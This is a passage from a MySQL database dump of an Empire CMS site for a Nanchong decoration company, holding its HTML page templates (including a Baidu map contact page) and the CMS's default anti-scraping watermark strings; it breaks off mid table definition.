-- Table structure for table `libang_enewsnewstemp`
--

DROP TABLE IF EXISTS `libang_enewsnewstemp`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsnewstemp` (
  `tempid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `tempname` varchar(60) NOT NULL DEFAULT '',
  `isdefault` tinyint(1) NOT NULL DEFAULT '0',
  `temptext` mediumtext NOT NULL,
  `showdate` varchar(50) NOT NULL DEFAULT '',
  `modid` smallint(6) NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`tempid`),
  KEY `classid` (`classid`)
) ENGINE=MyISAM AUTO_INCREMENT=13 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsnewstemp`
--

LOCK TABLES `libang_enewsnewstemp` WRITE;
/*!40000 ALTER TABLE `libang_enewsnewstemp` DISABLE KEYS */;
INSERT INTO `libang_enewsnewstemp` VALUES (1,'新闻内容模板',0,'<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<div><img src=\\\"/images/2019092011404080.jpg\\\" alt=\\\"\\\" /></div>\r\n\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_news\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_news_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    [showclasstemp]3,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_news_content\\\">\r\n            <div class=\\\"daohang\\\"><p>当前位置：[!--newsnav--]</div>\r\n            <div class=\\\"ny_newsdetial\\\">\r\n                <div class=\\\"news_name\\\">\r\n                    <h2>[!--title--]</h2>\r\n                    <p>时间：[!--newstime--] 来源：本站 作者：管理员</p>\r\n                </div>\r\n                <div class=\\\"prodetail22\\\">\r\n                    <p style=\\\"text-indent:2em;\\\">\r\n	               [!--newstext--]\r\n                    </p>\r\n                </div>\r\n            </div>\r\n            <div class=\\\"sx\\\">\r\n                <div style=\\\" text-align:left; float:left; width:49%; margin-left:1%; line-height:40px;\\\">上一篇：[!--info.pre--]</div>\r\n                <div style=\\\" text-align:right; float:right; width:49%; margin-right:1%; line-height:40px;\\\">下一篇：[!--info.next--]</div>\r\n            </div>\r\n        </div>\r\n    </div>\r\n</div>\r\n\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n','Y-m-d H:i:s',1,0),(2,'产品内容模板',0,'<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<img src=\\\"/images/2019092011402622.jpg\\\" alt=\\\"\\\" />\r\n\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n\r\n\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_pro\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_pro_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    [showclasstemp]1,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n           [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_pro_content\\\">\r\n            <div class=\\\"daohang\\\"><p>当前位置：[!--newsnav--]</div>\r\n            <div class=\\\"ny_prodetail_txt\\\">\r\n                <img src=\\\"[!--titlepic--]\\\" alt=\\\"[!--title--]\\\" />\r\n                <div class=\\\"shuoming\\\">\r\n                    <span>[!--title--]</span><br/>\r\n                    <p>[!--smalltext--]</p>\r\n                    <i><font>咨询热线：</font>0817-3618388</i>\r\n                </div>\r\n            </div>\r\n            <div class=\\\"ny_prodetail_txt2\\\">\r\n                <div class=\\\"ny_detailtxt_content\\\">\r\n                    <div class=\\\"ny_detailtxt_i\\\"><p></p></div>\r\n                    <p>\r\n                       [!--newstext--]\r\n                    </p>\r\n                </div>\r\n            </div>\r\n            \r\n            <div class=\\\"sx\\\">\r\n                <div style=\\\" text-align:left; float:left; width:49%; margin-left:1%; line-height:40px;\\\">\r\n                    上一篇：[!--info.pre--]</div>\r\n                <div style=\\\" text-align:right; float:right; width:49%; margin-right:1%; line-height:40px;\\\">\r\n                    下一篇：[!--info.next--]</div>\r\n            </div>\r\n        </div>\r\n    </div>\r\n</div>\r\n\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n\r\n</body>\r\n</html>\r\n','Y-m-d',1,0),(3,'公司简介内容模板',0,'<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<div><img src=\\\"/images/2019092011405530.jpg\\\" alt=\\\"\\\" /></div>\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_news\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_about_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    [showclasstemp]2,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_news_content\\\">\r\n            <div class=\\\"daohang\\\"><p>当前位置：[!--newsnav--]</div>\r\n            <div class=\\\"ny_newsdetial\\\">\r\n                <div class=\\\"news_name\\\">\r\n                    <h2>公司简介</h2>\r\n                    <p>&nbsp;</p>\r\n                </div>\r\n                <div class=\\\"prodetail22\\\">\r\n                    <p>\r\n	<br />\r\n</p>\r\n<p class=\\\"ldls\\\" style=\\\"text-indent:2em;\\\">\r\n	[!--newstext--]\r\n</p>\r\n                </div>\r\n            </div>\r\n        </div>\r\n    </div>\r\n</div>\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n','Y-m-d H:i:s',1,0),(10,'联系我们内容模板',0,'<!DOCTYPE html\r\n  PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n\r\n<head>\r\n  <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\" />\r\n  <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\" />\r\n  <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n  <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n  <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n  <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n  <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\" />\r\n  <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\" />\r\n  <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\" />\r\n  <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\" />\r\n  <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n  <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n  <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n  <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n  <!-- 百度地图 -->\r\n  <script type=\\\"text/javascript\\\" src=\\\"http://api.map.baidu.com/api?v=2.0&ak=IChq54iGzyGEG9ARv2AAZlirX0m0DLwG\\\"></script>\r\n  <style>\r\n    #map {\r\n      overflow: hidden;\r\n      margin: 0 auto;\r\n      width: 80%;\r\n      height: 300px;\r\n    }\r\n  </style>\r\n\r\n</head>\r\n\r\n<body>\r\n  [!--temp.header--]\r\n  <div class=\\\"ny_banner\\\">\r\n    <div><img src=\\\"/images/2019092011405530.jpg\\\" alt=\\\"\\\" /></div>\r\n  </div>\r\n  <div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n      <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n      </div>\r\n\r\n    </div>\r\n  </div>\r\n  <div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_news\\\">\r\n      <div class=\\\"ny_l\\\">\r\n        <div class=\\\"product_l product_l2\\\">\r\n          <dl>\r\n            <dt><img src=\\\"/images/ny_about_l_title.png\\\" alt=\\\"\\\"></dt>\r\n            [showclasstemp]2,1,0,0[/showclasstemp]\r\n          </dl>\r\n        </div>\r\n        [!--temp.tel--]\r\n      </div>\r\n      <!-- 联系我们文本信息 -->\r\n      <div class=\\\"ny_news_content\\\">\r\n        <div class=\\\"daohang\\\">\r\n          <p>当前位置：[!--newsnav--]\r\n        </div>\r\n        <div class=\\\"ny_newsdetial\\\">\r\n          <div class=\\\"news_name\\\">\r\n            <h2>联系我们</h2>\r\n            <p>&nbsp;</p>\r\n          </div>\r\n          <div class=\\\"prodetail22\\\">\r\n            <p>\r\n              <br />\r\n            </p>\r\n            <p class=\\\"ldls\\\" style=\\\"text-indent:2em;\\\">\r\n              [!--newstext--]\r\n            </p>\r\n          </div>\r\n        </div>\r\n        <div id=\\\"map\\\"></div>\r\n        <script type=\\\"text/javascript\\\">\r\n          //当浏览器窗口大小改变时，设置显示内容的高度\r\n          window.onresize = function () {\r\n            // changeDivHeight();\r\n          }\r\n          var map;\r\n          initMap();\r\n\r\n          function changeDivHeight() {\r\n            // 每次窗口大小改变后调用这个方法\r\n            map.invalidateSize(true);\r\n          }\r\n\r\n\r\n          //创建和初始化地图函数：\r\n          function initMap() {\r\n            createMap();//创建地图\r\n            setMapEvent();//设置地图事件\r\n            addMapControl();//向地图添加控件\r\n            addMapOverlay();//向地图添加覆盖物\r\n          }\r\n\r\n            function createMap(){ \r\n            map = new BMap.Map(\\\"map\\\"); \r\n            map.centerAndZoom(new BMap.Point(106.104154,30.779038),19);\r\n    }\r\n\r\n\r\n          function setMapEvent() {\r\n            map.enableScrollWheelZoom();\r\n            map.enableKeyboard();\r\n            map.enableDragging();\r\n            map.enableDoubleClickZoom();\r\n            map.enableAutoResize();\r\n          }\r\n\r\n          function addClickHandler(target, window) {\r\n            target.addEventListener(\\\"click\\\", function () {\r\n              target.openInfoWindow(window);\r\n            });\r\n          }\r\n\r\n          function addMapOverlay() {\r\n            var markers = [\r\n        {content:\\\"南充市丽邦装饰工程有限公司\\\",title:\\\"南充市丽邦装饰工程有限公司\\\",imageOffset: {width:0,height:3},position:{lat:30.779065,lng:106.103665}}\r\n      ];\r\n            for (var index = 0; index < markers.length; index++) {\r\n              var point = new BMap.Point(markers[index].position.lng, markers[index].position.lat);\r\n              var marker = new BMap.Marker(point, {\r\n                icon: new BMap.Icon(\\\"http://api.map.baidu.com/lbsapi/createmap/images/icon.png\\\", new BMap.Size(20, 25), {\r\n                  imageOffset: new BMap.Size(markers[index].imageOffset.width, markers[index].imageOffset.height)\r\n                })\r\n              });\r\n              var label = new BMap.Label(markers[index].title, { offset: new BMap.Size(25, 5) });\r\n              var opts = {\r\n                width: 200,\r\n                title: markers[index].title,\r\n                enableMessage: false\r\n              };\r\n              var infoWindow = new BMap.InfoWindow(markers[index].content, opts);\r\n              marker.setLabel(label);\r\n              addClickHandler(marker, infoWindow);\r\n              map.addOverlay(marker);\r\n            }\r\n            ;\r\n          }\r\n\r\n          //向地图添加控件\r\n          function addMapControl() {\r\n            var scaleControl = new BMap.ScaleControl({ anchor: BMAP_ANCHOR_BOTTOM_LEFT });\r\n            scaleControl.setUnit(BMAP_UNIT_IMPERIAL);\r\n            map.addControl(scaleControl);\r\n            var navControl = new BMap.NavigationControl({\r\n              anchor: BMAP_ANCHOR_TOP_LEFT,\r\n              type: BMAP_NAVIGATION_CONTROL_LARGE\r\n            });\r\n            map.addControl(navControl);\r\n            var overviewControl = new BMap.OverviewMapControl({ anchor: BMAP_ANCHOR_BOTTOM_RIGHT, isOpen: true });\r\n            map.addControl(overviewControl);\r\n          }\r\n\r\n        </script>\r\n      </div>\r\n    </div>\r\n  </div>\r\n  [!--temp.footer--]\r\n  <script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n  <div id=\\\"kefu\\\"></div>\r\n  <script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n  <script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n\r\n</html>','Y-m-d H:i:s',1,0),(11,'企业文化内容模板',0,'<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<div><img src=\\\"/images/2019092011405530.jpg\\\" alt=\\\"\\\" /></div>\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_news\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_about_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    [showclasstemp]2,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_news_content\\\">\r\n            <div class=\\\"daohang\\\"><p>当前位置：[!--newsnav--]</div>\r\n            <div class=\\\"ny_newsdetial\\\">\r\n                <div class=\\\"news_name\\\">\r\n                    <h2>企业文化</h2>\r\n                    <p>&nbsp;</p>\r\n                </div>\r\n                <div class=\\\"prodetail22\\\">\r\n                    <p>\r\n	<br />\r\n</p>\r\n<p class=\\\"ldls\\\" style=\\\"text-indent:2em;\\\">\r\n	[!--newstext--]\r\n</p>\r\n                </div>\r\n            </div>\r\n        </div>\r\n    </div>\r\n</div>\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n','Y-m-d H:i:s',1,0),(12,'公司风采内容模板',0,'<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<div><img src=\\\"/images/2019092011405530.jpg\\\" alt=\\\"\\\" /></div>\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_news\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_about_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    [showclasstemp]2,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_news_content\\\">\r\n            <div class=\\\"daohang\\\"><p>当前位置：[!--newsnav--]</div>\r\n            <div class=\\\"ny_newsdetial\\\">\r\n                <div class=\\\"news_name\\\">\r\n                    <h2>公司风采</h2>\r\n                    <p>&nbsp;</p>\r\n                </div>\r\n                <div class=\\\"prodetail22\\\">\r\n                    <p>\r\n	<br />\r\n</p>\r\n<p class=\\\"ldls\\\" style=\\\"text-indent:2em;\\\">\r\n	[!--newstext--]\r\n</p>\r\n                </div>\r\n            </div>\r\n        </div>\r\n    </div>\r\n</div>\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n','Y-m-d H:i:s',1,0);
/*!40000 ALTER TABLE `libang_enewsnewstemp` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsnewstempclass`
--

DROP TABLE IF EXISTS `libang_enewsnewstempclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsnewstempclass` (
  `classid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `classname` varchar(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsnewstempclass`
--

LOCK TABLES `libang_enewsnewstempclass` WRITE;
/*!40000 ALTER TABLE `libang_enewsnewstempclass` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsnewstempclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsnotcj`
--

DROP TABLE IF EXISTS `libang_enewsnotcj`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsnotcj` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `word` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsnotcj`
--

LOCK TABLES `libang_enewsnotcj` WRITE;
/*!40000 ALTER TABLE `libang_enewsnotcj` DISABLE KEYS */;
INSERT INTO `libang_enewsnotcj` VALUES (1,'<input type=hidden value=\'欢迎使用帝国网站管理系统：www.phome.net\'>'),(2,'<phome 帝国网站管理系统,phome.net>'),(3,'<!--帝国CMS,phome.net-->'),(4,'<table style=display:none><tr><td>\r\nEmpire CMS,phome.net\r\n</td></tr></table>'),(5,'<div style=display:none>\r\n拥有帝国一切，皆有可能。欢迎访问phome.net\r\n</div>');
/*!40000 ALTER TABLE `libang_enewsnotcj` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsnotice`
--

DROP TABLE IF EXISTS `libang_enewsnotice`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsnotice` (
